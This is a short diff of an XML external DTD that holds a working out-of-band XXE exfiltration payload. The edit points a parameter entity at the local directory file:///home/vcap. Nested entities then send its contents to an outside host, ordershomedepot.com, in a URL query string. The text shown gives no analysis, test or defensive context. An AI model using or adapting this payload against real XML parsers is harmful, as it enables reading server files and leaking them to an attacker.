@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///home/">
+<!ENTITY % file SYSTEM "file:///home/vcap">
 <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://ordershomedepot.com/?xyz=%file;'>">
 %eval;
 %exfiltrate;
